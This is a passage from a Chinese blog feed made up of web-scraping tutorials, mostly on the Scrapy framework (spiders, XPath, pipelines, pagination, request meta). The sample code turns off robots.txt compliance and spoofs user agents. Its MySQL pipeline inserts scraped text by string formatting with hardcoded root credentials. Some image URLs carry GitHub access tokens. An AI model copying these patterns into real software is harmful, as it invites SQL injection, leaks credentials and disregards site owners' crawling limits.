<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line">    ua = UserAgent()</span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://www.tuao8.xyz/category-2_2.html&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user-agent&#x27;</span>: ua.random</span><br><span class="line">    &#125;</span><br><span class="line">    asyncio.run(main())</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;全部下载完成!耗时:&#x27;</span>, <span class="built_in">int</span>(end - start), <span class="string">&#x27;秒&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151424766.png?token=ARYCSASWHOWU3BBPK4JWMATCQCOMA"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span clas</summary>
      
    
    
    
    <category term="爬虫" scheme="http://example.com/categories/%E7%88%AC%E8%99%AB/"/>
    
    
    <category term="requests" scheme="http://example.com/tags/requests/"/>
    
    <category term="异步" scheme="http://example.com/tags/%E5%BC%82%E6%AD%A5/"/>
    
  </entry>
  
  <entry>
    <title>scrapy框架学习</title>
    <link href="http://example.com/2022/04/08/scrapy%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2022/04/08/scrapy%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-04-08T10:57:11.000Z</published>
    <updated>2022-05-15T05:43:12.637Z</updated>
    
    <content type="html"><![CDATA[<h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy startproject tutorial</span><br></pre></td></tr></table></figure><h2 id="创建任务"><a href="#创建任务" class="headerlink" title="创建任务"></a>创建任务</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy genspider first www.baidu.com</span><br></pre></td></tr></table></figure><p>会生成一个first文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FirstSpider</span>(scrapy.Spider):</span><br><span class="line">    <span class="comment"># 唯一标识符</span></span><br><span class="line">    name = <span class="string">&#x27;first&#x27;</span></span><br><span class="line">    <span class="comment"># 允许的域名</span></span><br><span class="line">    allowed_domains = [<span class="string">&#x27;www.baidu.com&#x27;</span>]</span><br><span class="line">    <span class="comment"># 起始的url,默认发送get请求</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;https://www.baidu.com/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 数据解析</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><p>只输出ERROR级别的日志</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 只输出ERROR级别的日志</span></span><br><span class="line">LOG_LEVEL = <span class="string">&#x27;ERROR&#x27;</span></span><br></pre></td></tr></table></figure><p>不遵从robots协议</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span>  </span><br></pre></td></tr></table></figure><p>指定ua</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USER_AGENT = <span class="string">&#x27;tutorial (+http://www.yourdomain.com)&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl first</span><br></pre></td></tr></table></figure><p>会输出一个response对象</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="number">200</span> https:<span class="regexp">//</span>www.baidu.com/&gt;</span><br></pre></td></tr></table></figure><h2 id="数据解析"><a href="#数据解析" class="headerlink" title="数据解析"></a>数据解析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FirstSpider</span>(scrapy.Spider):</span><br><span class="line">    name = <span class="string">&#x27;first&#x27;</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;https://ishuo.cn/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        <span class="comment"># 返回一个selector对象</span></span><br><span class="line">        title_list = response.xpath(<span class="string">&#x27;//*[@id=&quot;list&quot;]/ul/li/div[1]/text()&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> title <span class="keyword">in</span> title_list:</span><br><span class="line">            <span class="built_in">print</span>(title)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到返回了一个selector对象,我们想要的数据在data属性里</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chenci@MacBook-Pro tutorial %scrapy crawl first</span><br><span class="line">&lt;Selector xpath=<span class="string">&#x27;//*[@id=&quot;list&quot;]/ul/li/div[1]/text()&#x27;</span> data=<span class="string">&#x27;如果你得罪了老板，失去的只是一份工作；如果你得罪了客户，失去的不过是一份订...&#x27;</span>&gt;</span><br><span class="line">&lt;Selector xpath=<span class="string">&#x27;//*[@id=&quot;list&quot;]/ul/li/div[1]/text()&#x27;</span> data=<span class="string">&#x27;有位非常漂亮的女同事，有天起晚了没有时间化妆便急忙冲到公司。结果那天她被记...&#x27;</span>&gt;</span><br><span class="line">&lt;Selector xpath=<span class="string">&#x27;//*[@id=&quot;list&quot;]/ul/li/div[1]/text()&#x27;</span> data=<span class="string">&#x27;悟空和唐僧一起上某卫视非诚勿扰,悟空上台,24盏灯全灭。理由:1.没房没车...&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>从data属性中取出我们想要的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FirstSpider</span>(scrapy.Spider):</span><br><span class="line">    name = <span class="string">&#x27;first&#x27;</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;https://ishuo.cn/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        <span class="comment"># 返回一个selector对象</span></span><br><span class="line">        title_list = response.xpath(<span class="string">&#x27;//*[@id=&quot;list&quot;]/ul/li/div[1]/text()&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> title <span class="keyword">in</span> title_list:</span><br><span class="line">            <span class="comment"># 取出数据</span></span><br><span class="line">            title = title.extract()  <span class="comment"># extract_first()取第一个</span></span><br><span class="line">            <span class="built_in">print</span>(title)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="持久化存储"><a href="#持久化存储" class="headerlink" title="持久化存储"></a>持久化存储</h2><h3 id="1-基于终端指令的存储"><a href="#1-基于终端指令的存储" class="headerlink" title="1.基于终端指令的存储"></a>1.基于终端指令的存储</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FirstSpider</span>(scrapy.Spider):</span><br><span class="line">    name = <span class="string">&#x27;first&#x27;</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;https://ishuo.cn/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        data_all = []</span><br><span class="line">        <span class="comment"># 返回一个selector对象</span></span><br><span class="line">        title_list = response.xpath(<span class="string">&#x27;//*[@id=&quot;list&quot;]/ul/li/div[1]/text()&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> title <span class="keyword">in</span> title_list:</span><br><span class="line">            <span class="comment"># 取出数据</span></span><br><span class="line">            title = title.extract()  <span class="comment"># extract_first()取第一个</span></span><br><span class="line">            <span class="comment"># 构造字典</span></span><br><span class="line">            dic = &#123;</span><br><span class="line">                <span class="string">&#x27;title&#x27;</span>: title</span><br><span class="line">            &#125;</span><br><span class="line">            data_all.append(dic)</span><br><span class="line">        <span class="comment"># 返回一个列表</span></span><br><span class="line">        <span class="keyword">return</span> data_all</span><br></pre></td></tr></table></figure><p>执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chenci@MacBook-Pro tutorial %scrapy crawl first -o test.csv</span><br></pre></td></tr></table></figure><h3 id="2-基于管道的持久化存储"><a href="#2-基于管道的持久化存储" class="headerlink" title="2.基于管道的持久化存储"></a>2.基于管道的持久化存储</h3><p>开启管道</p><p>settings.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">    <span class="string">&#x27;tutorial.pipelines.TutorialPipeline&#x27;</span>: <span class="number">300</span>,  <span class="comment"># 300表示优先级,越小优先级越高</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在items.py中定义相关属性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TutorialItem</span>(scrapy.Item):</span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    <span class="comment"># name = scrapy.Field()</span></span><br><span class="line">    <span class="comment"># Field定义好的属性当做万能属性</span></span><br><span class="line">    title = scrapy.Field()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将first.py提取出的数据提交给管道</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> tutorial.items <span class="keyword">import</span> TutorialItem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FirstSpider</span>(scrapy.Spider):</span><br><span class="line">    name = <span class="string">&#x27;first&#x27;</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;https://ishuo.cn/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        <span class="comment"># 返回一个selector对象</span></span><br><span class="line">        title_list = response.xpath(<span class="string">&#x27;//*[@id=&quot;list&quot;]/ul/li/div[1]/text()&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> title <span class="keyword">in</span> title_list:</span><br><span class="line">            <span class="comment"># 取出数据</span></span><br><span class="line">            title = title.extract()  <span class="comment"># extract_first()取第一个</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 实例化一个item对象,将解析到的数据存入到该对象</span></span><br><span class="line">            item = TutorialItem()</span><br><span class="line">            <span class="comment"># 通过字典的方式调用</span></span><br><span class="line">            item[<span class="string">&#x27;title&#x27;</span>] = title</span><br><span class="line">            <span class="comment"># 将item对象提交给管道</span></span><br><span class="line">            <span class="keyword">yield</span> item</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在pipelines.py中重写父类方法,存储到本地</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TutorialPipeline</span>:</span><br><span class="line">    <span class="comment"># 重写父类方法</span></span><br><span class="line">    f = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">open_spider</span>(<span class="params">self, spider</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;我是open_spider,只会在爬虫开始的时候执行一次&#x27;</span>)</span><br><span class="line">        self.f = <span class="built_in">open</span>(<span class="string">&#x27;./text1.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">close_spider</span>(<span class="params">self, spider</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;我是close_spider,只会在爬虫开始的时候执行一次&#x27;</span>)</span><br><span class="line">        self.f.close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 该方法是用来接收item对象的,一次只能接收一个item,说明该方法会被多次调用</span></span><br><span class="line">    <span class="comment"># 参数item就是接收的item对象</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_item</span>(<span class="params">self, item, spider</span>):</span><br><span class="line">        <span class="comment"># 存储到本地文件</span></span><br><span class="line">        self.f.write(item[<span class="string">&#x27;title&#x27;</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure><p>基于管道实现数据的备份</p><p>pipelines.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MysqlPipeline</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    conn = <span class="literal">None</span></span><br><span class="line">    cursor = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 重写父类</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">open_spider</span>(<span class="params">self, spider</span>):</span><br><span class="line">        <span class="comment"># 数据库连接对象</span></span><br><span class="line">        self.conn = pymysql.Connect(host=<span class="string">&#x27;localhost&#x27;</span>, port=<span class="number">3306</span>, user=<span class="string">&#x27;root&#x27;</span>, password=<span class="string">&#x27;123456&#x27;</span>, charset=<span class="string">&#x27;utf8&#x27;</span>,</span><br><span class="line">                                    db=<span class="string">&#x27;spider&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_item</span>(<span class="params">self, item, spider</span>):</span><br><span class="line">        self.cursor = self.conn.cursor()</span><br><span class="line">        sql = <span class="string">&#x27;insert into duanzi values(&quot;%s&quot;)&#x27;</span> % item[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">        <span class="comment"># 事务处理</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.cursor.execute(sql)</span><br><span class="line">            self.conn.commit()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            self.conn.rollback()</span><br><span class="line">        <span class="comment"># 返回item会给下一个管道使用,如果不返回,下一个管道将接收不到</span></span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 重写父类,关闭连接</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">close_spider</span>(<span class="params">self, spider</span>):</span><br><span class="line">        self.cursor.close()</span><br><span class="line">        self.conn.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在settings.py增加一个管道</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">    <span class="comment"># 爬虫文件中的item只会提交给优先级最高的那一个管道类</span></span><br><span class="line">    <span class="string">&#x27;tutorial.pipelines.TutorialPipeline&#x27;</span>: <span class="number">300</span>,</span><br><span class="line">    <span class="string">&#x27;tutorial.pipelines.MysqlPipeline&#x27;</span>: <span class="number">301</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="手动请求发送"><a href="#手动请求发送" class="headerlink" title="手动请求发送"></a>手动请求发送</h2><p>新建工程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chenci@MacBook-Pro scrapy %scrapy startproject HandReq</span><br><span class="line">chenci@MacBook-Pro scrapy %<span class="built_in">cd</span> HandReq </span><br><span class="line">chenci@MacBook-Pro HandReq %scrapy genspider duanzi www.xxx.com</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> HandReq.items <span class="keyword">import</span> HandreqItem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DuanziSpider</span>(scrapy.Spider):</span><br><span class="line">    name = <span class="string">&#x27;duanzi&#x27;</span></span><br><span class="line">    <span class="comment"># allowed_domains = [&#x27;www.xxx.com&#x27;]</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;https://duanzixing.com/page/1/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 通用的url模板</span></span><br><span class="line">    url = <span class="string">&#x27;https://duanzixing.com/page/%d/&#x27;</span></span><br><span class="line">    page_num = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        title_list = response.xpath(<span class="string">&#x27;/html/body/section/div/div/article[1]/header/h2/a/text()&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> title <span class="keyword">in</span> title_list:</span><br><span class="line">            title = title.extract()</span><br><span class="line">            item = HandreqItem()</span><br><span class="line">            item[<span class="string">&#x27;title&#x27;</span>] = title</span><br><span class="line">            <span class="keyword">yield</span> item</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.page_num &lt; <span class="number">5</span>:</span><br><span class="line">            <span class="comment"># 构造页码</span></span><br><span class="line">            new_url = <span class="built_in">format</span>(self.url % self.page_num)</span><br><span class="line">            self.page_num += <span class="number">1</span></span><br><span class="line">            <span class="comment"># 对新的url发起请求,递归回调自己</span></span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(url=new_url, callback=self.parse)</span><br><span class="line">            <span class="comment"># scrapy.FormRequest(url,callback,formdata) 发送post请求</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="五大核心组件工作流程"><a href="#五大核心组件工作流程" class="headerlink" title="五大核心组件工作流程"></a>五大核心组件工作流程</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151340834.png?token=ARYCSAUIENI4WQ2X26Z4EQ3CQCJIM"></p><p>引擎(Scrapy)</p><pre><code>用来处理整个系统的数据流处理, 触发事务(框架核心)</code></pre><p>调度器(Scheduler)</p><pre><code>用来接受引擎发过来的请求, 压入队列中, 并在引擎再次请求的时候返回. 可以想像成一个URL（抓取网页的网址或者说是链接）的优先队列, 由它来决定下一个要抓取的网址是什么, 同时去除重复的网址</code></pre><p>下载器(Downloader)</p><pre><code>用于下载网页内容, 并将网页内容返回给蜘蛛(Scrapy下载器是建立在twisted这个高效的异步模型上的)</code></pre><p>爬虫(Spiders)</p><pre><code>爬虫是主要干活的, 用于从特定的网页中提取自己需要的信息, 即所谓的实体(Item)。用户也可以从中提取出链接,让Scrapy继续抓取下一个页面</code></pre><p>项目管道(Pipeline)</p><pre><code>负责处理爬虫从网页中抽取的实体，主要的功能是持久化实体、验证实体的有效性、清除不需要的信息。当页面被爬虫解析后，将被发送到项目管道，并经过几个特定的次序处理数据。</code></pre><h2 id="请求传参的深度爬取-4567kan-com"><a href="#请求传参的深度爬取-4567kan-com" class="headerlink" title="请求传参的深度爬取-4567kan.com"></a>请求传参的深度爬取-4567kan.com</h2><p>文件目录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151341626.png?token=ARYCSAWOAVW6ADT6LYL7NY3CQCJMU"></p><pre><code>meta是一个字典,可以将meta传给callback    scrapy.Request(url, callback, meta)callback取出字典    item = response.meta[&#39;item&#39;]</code></pre><p>move.py 项目文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> move_4567kan.items <span class="keyword">import</span> Move4567KanItem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MoveSpider</span>(scrapy.Spider):</span><br><span class="line">    name = <span class="string">&#x27;move&#x27;</span></span><br><span class="line">    <span class="comment"># allowed_domains = [&#x27;www.xxx.com&#x27;]</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;https://www.4567kan.com/frim/index1-1.html&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造页码</span></span><br><span class="line">    url = <span class="string">&#x27;https://www.4567kan.com/frim/index1-%d.html&#x27;</span></span><br><span class="line">    page_num = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        <span class="comment"># 抓取url和title</span></span><br><span class="line">        li_list = response.xpath(<span class="string">&#x27;/html/body/div[2]/div/div[3]/div/div[2]/ul/li&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> li <span class="keyword">in</span> li_list:</span><br><span class="line">            url = <span class="string">&#x27;https://www.4567kan.com&#x27;</span> + li.xpath(<span class="string">&#x27;./div/a/@href&#x27;</span>).extract()[<span class="number">0</span>]</span><br><span class="line">            title = li.xpath(<span class="string">&#x27;./div/a/@title&#x27;</span>).extract()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 传递给item</span></span><br><span class="line">            item = Move4567KanItem()</span><br><span class="line">            item[<span class="string">&#x27;title&#x27;</span>] = title</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 对详情页发起请求,回调get_details函数</span></span><br><span class="line">            <span class="comment"># meta请求传参,以字典形式,传给get_details函数,因为item只能是唯一</span></span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(url=url, callback=self.get_details, meta=&#123;<span class="string">&#x27;item&#x27;</span>: item&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 爬取多页</span></span><br><span class="line">        <span class="keyword">if</span> self.page_num &lt; <span class="number">5</span>:</span><br><span class="line">            <span class="comment"># 构造页码</span></span><br><span class="line">            new_url = <span class="built_in">format</span>(self.url % self.page_num)</span><br><span class="line">            self.page_num += <span class="number">1</span></span><br><span class="line">            <span class="comment"># 对新的url发起请求,递归回调自己</span></span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(url=new_url, callback=self.parse)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 自定义函数去抓取详情</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_details</span>(<span class="params">self, response</span>):</span><br><span class="line">        details = response.xpath(<span class="string">&#x27;//*[@class=&quot;detail-content&quot;]/text()&#x27;</span>).extract()</span><br><span class="line">        <span class="comment"># 判断,没有返回None</span></span><br><span class="line">        <span class="keyword">if</span> details:</span><br><span class="line">            details = details[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            details = <span class="literal">None</span></span><br><span class="line">        <span class="comment"># 接受item</span></span><br><span class="line">        item = response.meta[<span class="string">&#x27;item&#x27;</span>]</span><br><span class="line">        item[<span class="string">&#x27;details&#x27;</span>] = details</span><br><span class="line">        <span class="comment"># 提交给管道</span></span><br><span class="line">        <span class="keyword">yield</span> item</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>items.py 定义两个字段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 